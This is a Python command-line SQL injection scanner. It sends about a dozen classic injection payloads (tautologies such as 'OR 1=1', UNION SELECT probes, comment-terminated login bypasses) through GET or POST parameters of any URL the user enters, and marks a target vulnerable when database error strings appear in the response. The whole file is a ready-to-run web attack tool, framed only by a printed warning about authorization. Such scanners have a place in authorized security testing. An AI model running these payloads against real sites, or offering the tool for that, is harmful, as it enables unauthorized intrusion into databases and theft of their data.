import requests
import threading
import time
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from typing import List, Dict, Optional
import sys

# Rate limiting
REQUEST_DELAY = 0.5  # seconds between requests
MAX_THREADS = 5

# Thread-safe logging
print_lock = threading.Lock()
results_lock = threading.Lock()
scan_results = []

# Common SQL injection payloads
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "' UNION SELECT NULL--",
    "1' OR '1'='1",
    "' OR 1=1--",
    "1' AND '1'='1",
    "') OR ('1'='1",
    "1' OR 1=1#",
    "' OR 1=1#",
    "1' OR '1'='1'--",
    "1' OR '1'='1'/*",
]


def log_result(url: str, param: str, payload: str, status: str, response_info: str = ""):
    """Thread-safe logging of scan results."""
    with results_lock:
        result = {
            "timestamp": datetime.now().isoformat(),
            "url": url,
            "parameter": param,
            "payload": payload,
            "status": status,
            "response_info": response_info,
        }
        scan_results.append(result)
        with print_lock:
            print(f"[{status}] {url} | Param: {param} | Payload: {payload[:30]}...")


def test_sql_injection(url: str, param: str, value: str, method: str = "GET") -> Optional[Dict]:
    """Test a single SQL injection payload."""
    time.sleep(REQUEST_DELAY)  # Rate limiting
    
    try:
        if method.upper() == "GET":
            params = {param: value}
            response = requests.get(url, params=params, timeout=5, allow_redirects=False)
        else:  # POST
            data = {param: value}
            response = requests.post(url, data=data, timeout=5, allow_redirects=False)
        
        # Check for SQL error indicators
        error_indicators = [
            "sql syntax",
            "mysql",
            "postgresql",
            "sqlite",
            "ora-",
            "microsoft ole db",
            "sql server",
            "warning: mysql",
            "unclosed quotation mark",
            "quoted string not properly terminated",
        ]
        
        response_text = response.text.lower()
        status_code = response.status_code
        
        # Check if response contains SQL error messages
        for indicator in error_indicators:
            if indicator in response_text:
                log_result(
                    url,
                    param,
                    value,
                    "VULNERABLE",
                    f"Found SQL error indicator: {indicator}",
                )
                return {
                    "vulnerable": True,
                    "indicator": indicator,
                    "status_code": status_code,
                }
        
        # Check for unusual status codes or response lengths
        if status_code == 500:
            log_result(url, param, value, "SUSPICIOUS", "HTTP 500 error")
            return {"vulnerable": False, "suspicious": True, "status_code": status_code}
        
        log_result(url, param, value, "SAFE", f"Status: {status_code}")
        return {"vulnerable": False, "status_code": status_code}
        
    except requests.exceptions.RequestException as e:
        log_result(url, param, value, "ERROR", str(e))
        return None


def scan_parameter(url: str, param: str, method: str = "GET"):
    """Scan a single parameter with all SQL injection payloads."""
    for payload in SQL_PAYLOADS:
        test_sql_injection(url, param, payload, method)


def extract_parameters_from_url(url: str) -> List[str]:
    """Extract GET parameters from URL."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return list(params.keys())


def scan_url(url: str, method: str = "GET", custom_params: Optional[List[str]] = None):
    """Scan a URL for SQL injection vulnerabilities."""
    print(f"\n[*] Scanning: {url} (Method: {method})")
    
    if method.upper() == "GET":
        params = custom_params or extract_parameters_from_url(url)
        if not params:
            print(f"[!] No parameters found in URL. Please specify parameters manually.")
            return
    else:  # POST
        params = custom_params or []
        if not params:
            print(f"[!] No POST parameters specified.")
            return
    
    print(f"[*] Found {len(params)} parameter(s): {', '.join(params)}")
    print(f"[*] Testing {len(SQL_PAYLOADS)} payloads per parameter...")
    
    threads = []
    for param in params:
        t = threading.Thread(target=scan_parameter, args=(url, param, method))
        threads.append(t)
        t.start()
        
        # Limit concurrent threads
        while threading.active_count() > MAX_THREADS:
            time.sleep(0.1)
    
    # Wait for all threads to complete
    for t in threads:
        t.join()
    
    print(f"\n[*] Scan completed for {url}")


def save_results(filename: str = "sql_scan_results.txt"):
    """Save scan results to a file."""
    with open(filename, "w") as f:
        f.write("SQL Injection Scan Results\n")
        f.write("=" * 50 + "\n")
        f.write(f"Scan completed at: {datetime.now()}\n")
        f.write(f"Total tests: {len(scan_results)}\n\n")
        
        vulnerable_count = sum(1 for r in scan_results if r["status"] == "VULNERABLE")
        suspicious_count = sum(1 for r in scan_results if r["status"] == "SUSPICIOUS")
        
        f.write(f"Vulnerable: {vulnerable_count}\n")
        f.write(f"Suspicious: {suspicious_count}\n")
        f.write(f"Safe: {len(scan_results) - vulnerable_count - suspicious_count}\n\n")
        f.write("-" * 50 + "\n\n")
        
        for result in scan_results:
            f.write(f"Time: {result['timestamp']}\n")
            f.write(f"URL: {result['url']}\n")
            f.write(f"Parameter: {result['parameter']}\n")
            f.write(f"Payload: {result['payload']}\n")
            f.write(f"Status: {result['status']}\n")
            if result['response_info']:
                f.write(f"Info: {result['response_info']}\n")
            f.write("\n")
    
    print(f"\n[*] Results saved to {filename}")


def main():
    print("=" * 60)
    print("SQL Injection Scanner")
    print("=" * 60)
    print("\n⚠️  WARNING: Only use this tool on systems you own or have")
    print("   explicit permission to test. Unauthorized testing is illegal.")
    print("=" * 60)
    
    print("\nSelect scan type:")
    print("  1) Scan URL with GET parameters")
    print("  2) Scan URL with POST parameters")
    print("  3) Scan URL and extract parameters automatically")
    
    choice = input("\nChoice (1-3): ").strip()
    
    url = input("Enter URL: ").strip()
    
    if choice == "1":
        params_input = input("Enter GET parameters (comma-separated, e.g., id,username): ").strip()
        params = [p.strip() for p in params_input.split(",")] if params_input else None
        scan_url(url, method="GET", custom_params=params)
    
    elif choice == "2":
        params_input = input("Enter POST parameters (comma-separated, e.g., username,password): ").strip()
        params = [p.strip() for p in params_input.split(",")] if params_input else None
        scan_url(url, method="POST", custom_params=params)
    
    elif choice == "3":
        scan_url(url, method="GET")
    
    else:
        print("Invalid choice.")
        return
    
    save_results()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[*] Scan interrupted by user.")
        if scan_results:
            save_results()
        sys.exit(0)
